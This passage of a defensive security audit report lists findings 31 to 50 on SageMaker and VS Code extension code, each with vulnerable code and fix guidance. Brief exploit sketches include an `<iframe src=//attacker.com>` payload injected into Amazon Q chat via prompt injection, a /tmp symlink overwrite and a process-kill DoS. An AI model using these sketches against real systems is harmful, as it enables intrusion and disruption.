**Severity:** Medium
**Reachable via GET?** Yes (if webview accessible)
**Endpoint(s):** All VS Code extension webviews
**Source:** vsCodeExtensionInterface.js:18-20 (and all Vue webviews)
```javascript
window.addEventListener('message', handleMessage)
function handleMessage(event) {
    const message = event.data // No event.origin check
```
**Sink:** State manipulation, file writes, content rendering via `updateContent()`
**Dataflow summary:**
- Cross-origin message → `event.data` → state update / content render / file save

**Why it's real:** No `event.origin` check in any handler across all webview files analyzed.
**Fix guidance:**
- Add `if (event.origin !== expectedOrigin) return;` check

---

### [FINDING 32]
**Title:** innerHTML with Permissive Tag Allowlist in Amazon Q Chat (iframe/embed/object)
**Severity:** Medium
**Reachable via GET?** Yes (via chat response rendering)
**Endpoint(s):** Amazon Q chat webview
**Source:** amazonq-ui.js (~line with AllowedTags)
```javascript
AllowedTags = ["a","audio","b","blockquote","br","hr","canvas","code",
    "div","em","embed","figcaption","figure","h1"..."iframe","img",
    "input","li","map","mark","object","ol","p","pre","q",...]
```
**Sink:** `innerHTML` assignments with `sanitize-html` using this allowlist
**Dataflow summary:**
- Amazon Q response → markdown parse → `sanitize-html` with permissive allowlist → `innerHTML`

**Exploit sketch:**
1. If attacker can influence Q response content (e.g., via prompt injection)
2. Include `<iframe src=//attacker.com>` in response
3. Passes sanitization due to iframe being in AllowedTags

**Why it's real:** `iframe`, `embed`, `object` in allowed tags enables resource loading and potential XSS.
**Fix guidance:**
- Remove `iframe`, `embed`, `object`, `canvas`, `audio` from AllowedTags

---

### [FINDING 33]
**Title:** Sensitive Credential File Without Restrictive Permissions
**Severity:** Medium
**Reachable via GET?** No (file system)
**Source:** detached-server/server.js (function `Or`)
```javascript
await V.promises.writeFile(s,o);
await V.promises.rename(s,Dr);
```
**Sink:** `~/.aws/.sagemaker-space-profiles` written without explicit permissions
**Why it's real:** `writeFile` defaults to 0o666 minus umask. Other local users may read credentials.
**Fix guidance:**
- Use `writeFile(path, data, {mode: 0o600})`

---

### [FINDING 34]
**Title:** Symlink Attack on Predictable `/tmp/.sagemaker-last-active-timestamp`
**Severity:** Medium
**Reachable via GET?** No (local)
**Source:** sagemaker-idle-extension/dist/extension.js
```javascript
l=s.join("/tmp/",".sagemaker-last-active-timestamp");
function d(){
    const e=(new Date).toISOString();
    c.writeFileSync(l,e)
}
```
**Sink:** `writeFileSync` to predictable path without symlink check
**Dataflow summary:**
- Fixed path `/tmp/.sagemaker-last-active-timestamp` → `writeFileSync` → follows symlinks

**Exploit sketch:**
1. Create symlink: `/tmp/.sagemaker-last-active-timestamp` → `/etc/important_file`
2. Extension overwrites the target file with a timestamp string

**Why it's real:** No `O_NOFOLLOW` flag. Predictable filename in world-writable `/tmp`.
**Fix guidance:**
- Use `mktemp` or add O_NOFOLLOW
- Use `/run/user/$UID/` instead of `/tmp/`

---

### [FINDING 35]
**Title:** AWS Debug Output Leaks SigV4 Credentials to Logs
**Severity:** Medium
**Reachable via GET?** No (log access)
**Source:** etc/sagemaker-ui/sagemaker_ui_post_startup.sh:92
```bash
domain_response=$(aws datazone get-domain --debug --endpoint-url "$dataZoneEndPoint" ...)
```
**Sink:** `--debug` outputs full HTTP headers including SigV4 signatures. `set -x` is active.
**Why it's real:** `set -x` from line 2 echoes the captured output containing auth headers.
**Fix guidance:**
- Remove `--debug` flag or add `set +x` before this command

---

### [FINDING 36]
**Title:** Docker Image Pulled with `:latest` Tag (Supply Chain)
**Severity:** Medium
**Reachable via GET?** No (startup)
**Source:** etc/sagemaker-ui/workflows/docker-compose.yaml:2
```yaml
image: 058264401727.dkr.ecr.${AWS_REGION}.amazonaws.com/mwaa_image:latest
```
**Sink:** Docker image pull and execution
**Why it's real:** `:latest` tag not pinned to digest. Image replacement possible if ECR compromised.
**Fix guidance:**
- Pin to image digest: `image@sha256:...`

---

### [FINDING 37]
**Title:** Unauthenticated Download and Root Execution of GitHub Archive
**Severity:** Medium
**Reachable via GET?** No (startup)
**Source:** etc/sagemaker-ui/workflows/sm-spark-cli-install.sh:12-16
```bash
sudo curl -LO https://github.com/aws-samples/amazon-sagemaker-spark-ui/releases/download/v0.9.1/amazon-sagemaker-spark-ui.tar.gz
sudo tar -xvzf amazon-sagemaker-spark-ui.tar.gz
sudo chmod +x amazon-sagemaker-spark-ui/install-scripts/studio/install-history-server.sh
sudo amazon-sagemaker-spark-ui/install-scripts/studio/install-history-server.sh
```
**Sink:** `sudo` execution of downloaded script without integrity verification
**Why it's real:** No checksum/signature verification. `tar -xvzf` vulnerable to path traversal in archive.
**Fix guidance:**
- Add checksum verification
- Pin to specific commit hash

---

### [FINDING 38]
**Title:** AWS Container Credentials Shared with Airflow Docker Container
**Severity:** Medium
**Reachable via GET?** No
**Source:** etc/sagemaker-ui/workflows/docker-compose.yaml:8
```yaml
AWS_CONTAINER_CREDENTIALS_RELATIVE_URI: ${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}
```
**Sink:** Airflow container inherits host IAM role credentials
**Why it's real:** Any Airflow DAG code (including user code) has access to the host's IAM credentials.
**Fix guidance:**
- Use scoped IAM role for the Airflow container

---

### [FINDING 39]
**Title:** Jupyter Server Runs as Root on All Interfaces
**Severity:** Medium
**Reachable via GET?** Yes
**Source:** opt/conda/entry_point.sh:2
```bash
python3 -m jupyter notebook --allow-root --ip=0.0.0.0 --port=8888
```
**Sink:** Jupyter kernel executes commands as root; accessible on all interfaces
**Why it's real:** `--allow-root` + `--ip=0.0.0.0` + kernel execution = root shell access to anyone with Jupyter access.
**Fix guidance:**
- Run as non-root user
- Bind to `127.0.0.1` unless proxy-fronted

---

### [FINDING 40]
**Title:** Extension Installation from User-Writable Persistent Volume
**Severity:** Medium
**Reachable via GET?** No (local)
**Source:** sagemaker-extensions-sync/dist/extension.js
```javascript
const e=["--list-extensions","--show-versions","--extensions-dir",E.PERSISTENT_VOLUME_EXTENSIONS_DIR],
t=(0,u.promisify)(d.execFile);
const{stdout:n,stderr:o}=await t("sagemaker-code-editor",e);
```
**Sink:** Extensions loaded from `/home/sagemaker-user/sagemaker-code-editor-server-data/extensions`
**Why it's real:** User-writable directory → malicious extension → code execution in editor context.
**Fix guidance:**
- Validate extension signatures before loading

---

### [FINDING 41]
**Title:** Unquoted `$DESTINATION_PATH` in `git clone` Commands
**Severity:** Medium
**Reachable via GET?** No
**Source:** etc/sagemaker-ui/git_clone.sh:52
```bash
git clone "$cloneUrl" $DESTINATION_PATH -b "$gitBranchName"
```
**Sink:** Unquoted `$DESTINATION_PATH` in shell command
**Why it's real:** Word splitting on `$DESTINATION_PATH` if it contains spaces.
**Fix guidance:**
- Quote: `"$DESTINATION_PATH"`

---

### [FINDING 42]
**Title:** Kernel Launcher Argument Injection via Unquoted Variables
**Severity:** Medium
**Reachable via GET?** No
**Source:** etc/sagemaker-ui/kernels/kernel_launchers/python3_kernel_launcher.sh:51
```bash
exec /opt/conda/bin/python -m ${kernel_type} -f ${connection_file}
```
**Sink:** `exec` with unquoted `${kernel_type}` and `${connection_file}`
**Why it's real:** Unquoted variables enable argument injection if values contain spaces.
**Fix guidance:**
- Quote: `exec /opt/conda/bin/python -m "${kernel_type}" -f "${connection_file}"`

---

### [FINDING 43]
**Title:** Path Traversal in `merge-settings-util.py`
**Severity:** Medium
**Reachable via GET?** No (CLI utility)
**Source:** usr/local/bin/merge-settings-util.py:6-18
```python
def main():
    file1, file2 = argv[1], argv[2]
    with open(file1, "r") as f1, open(file2, "r") as f2:
        data1 = json.load(f1)
        data2 = json.load(f2)
    merged_data = {**data1, **data2}
    with open(file1, "w") as f:
        json.dump(merged_data, f)
```
**Sink:** Reads and writes arbitrary files based on command-line arguments
**Why it's real:** No path validation. Can read from and overwrite any file.
**Fix guidance:**
- Validate paths against allowed directories

---

### [FINDING 44]
**Title:** `$clear` Command Resets Webview State Without Auth (State Disruption)
**Severity:** Low
**Reachable via GET?** Yes (via postMessage)
**Source:** All Vue webviews (login, feedback, lambda, etc.)
```javascript
window.addEventListener("message", h => {
    const { command: S } = h.data;
    if (S === "$clear") {
        vscode.setState({});
        // remount
    }
})
```
**Sink:** `vscode.setState({})` clears state; webview remounts
**Why it's real:** No origin check (Finding 31). Any message with `{command: "$clear"}` clears state.
**Fix guidance:**
- Same as Finding 31 — add origin validation

---

### [FINDING 45]
**Title:** Threat Composer File Path Manipulation via postMessage
**Severity:** Medium
**Reachable via GET?** Yes (via postMessage to webview)
**Source:** vsCodeExtensionInterface.js:24-37
```javascript
case 'FILE_CHANGED':
    const fileContents = message.fileContents
    vscode.setState({
        fileName: message.fileName,
        filePath: message.filePath,  // attacker-controlled
        fileContents: fileContents,
    })
    updateContent(fileContents)
```
**Sink:** `setState` stores filePath; subsequent `SAVE_FILE` writes to that path
**Dataflow summary:**
- postMessage → `message.filePath` → stored in state → used when saving → potential arbitrary file write

**Why it's real:** Combined with Finding 31, crafted messages can manipulate file save targets.
**Fix guidance:**
- Validate filePath on the extension host side before writing

---

### [FINDING 46]
**Title:** highlight.js innerHTML with Unescaped HTML Pass-through
**Severity:** Low
**Reachable via GET?** Yes (code block rendering)
**Source:** Security issue webview (codewhisperer/views/securityIssue/vue/index.js)
```javascript
P.innerHTML = Re.value
// highlight.js warns but continues
```
**Sink:** `innerHTML` assignment with highlighted code that may contain pre-existing HTML
**Why it's real:** Known highlight.js security issue. Code blocks with embedded HTML are rendered.
**Fix guidance:**
- Set `ignoreUnescapedHTML: false` and `throwUnescapedHTML: true`

---

### [FINDING 47]
**Title:** No Authentication on Inference Server Endpoints
**Severity:** Medium
**Reachable via GET?** Yes (GET `/ping`); POST `/invocations`
**Source:** etc/sagemaker-inference-server/tornado_server/async_handler.py:68-73
```python
app = tornado.web.Application([
    (r"/invocations", InvocationsHandler, ...),
    (r"/ping", PingHandler),
])
```
**Sink:** No auth middleware. All requests accepted.
**Why it's real:** Relies entirely on network isolation for security. No defense-in-depth.
**Fix guidance:**
- Add API key or token authentication

---

### [FINDING 48]
**Title:** Broad Exception Handling Suppresses Security Errors
**Severity:** Low
**Reachable via GET?** N/A
**Source:** Multiple files — `except: pass` pattern
- etc/jupyter/jupyter_server_config.py:27-28
- etc/sagemaker-ui/workflows/workflow_client.py:76-88
```python
except:
    pass
```
**Why it's real:** Catches `SystemExit`, `KeyboardInterrupt`. Can suppress security-relevant errors.
**Fix guidance:**
- Use `except Exception:` at minimum, or specific exception types

---

### [FINDING 49]
**Title:** URL Construction from Unvalidated Metadata in SageMaker Extension
**Severity:** Medium
**Reachable via GET?** No
**Source:** sagemaker-extension/dist/extension.js
```javascript
const{DataZoneDomainId:n,DataZoneDomainRegion:o,DataZoneProjectId:r}=e.AdditionalMetadata;
return `https://${n}.sagemaker.${o}.on.aws/projects/${r}/overview`
```
**Sink:** URL opened via `vscode.env.openExternal()`
**Dataflow summary:**
- Metadata file → unvalidated values → URL construction → `openExternal()`

**Why it's real:** No format validation on domain ID, region, or project ID before URL construction.
**Fix guidance:**
- Validate formats (as smus-mcp.py does with regex)

---

### [FINDING 50]
**Title:** Overly Aggressive Process Killing Enables DoS
**Severity:** Medium
**Reachable via GET?** No (terminal events)
**Source:** sagemaker-terminal-crash-mitigation/dist/extension.js
```javascript
(0,c.exec)("ps -eo pid,comm | grep bash | awk '{print $1}'",(e,o,r)=>{
    t.forEach((e=>{
        (0,c.exec)(`kill -9 ${e}`,...)
    }))
})
```
**Sink:** `kill -9` on ALL bash processes
**Dataflow summary:**
- Terminal crash within 1 second → kills ALL bash processes system-wide

**Exploit sketch:**
1. Rapidly open and close terminal connections
2. All bash processes killed (including background jobs, running scripts)

**Why it's real:** No check that processes belong to current user session.
**Fix guidance:**
- Limit kill to processes owned by current session/user
- Use process groups instead of blanket kill

---

## Metrics Summary

| Category | Count |
|----------|-------|
| Command Injection / RCE | 15 |
| XSS (Stored/DOM) | 5 |
| SSRF | 4 |
| Auth Bypass / Missing Auth | 5 |
| Supply Chain / Code Injection | 6 |
| Open Redirect | 2 |
| Information Disclosure | 4 |
| Path Traversal | 4 |
| CSRF | 2 |
| DoS | 1 |
| Other (Config/Permissions) | 2 |
| **Total** | **50** |

| Severity | Count |
|----------|-------|
| Critical | 6 |
| High | 13 |
| Medium | 25 |
| Low | 6 |

## Files Analyzed

- **Shell scripts:** 12 (git_clone.sh, git_config.sh, sagemaker_ui_post_startup.sh, network_validation.sh, install-lib.sh, start-workflows-container.sh, sm-spark-cli-install.sh, python3_kernel_launcher.sh, entry_point.sh, healthcheck.sh, startup.sh, sm_init_script.sh)
- **Python:** 10 (inference server: serve.py, async_handler.py, sync_handler.py, stream_handler.py, server.py, environment.py; configs: jupyter_server_config.py ×3, smus-mcp.py, workflow_client.py, merge-settings-util.py)
- **JavaScript:** 15+ (amazonq-ui.js, aws-lsp-codewhisperer.js, lspServer.js, detached-server/server.js ×2, vsCodeExtensionInterface.js ×4, vscode.js ×4, sagemaker-extension/dist/extension.js, sagemaker-extensions-sync/dist/extension.js, sagemaker-idle-extension/dist/extension.js, sagemaker-open-notebook-extension/dist/extension.js, sagemaker-terminal-crash-mitigation/dist/extension.js, extensionNode.js)
- **YAML/JSON:** 5+ (docker-compose.yaml, package.json files, jupyter config JSONs)
- **Endpoints analyzed:** 9 distinct route patterns
- **Sinks traced:** 50+
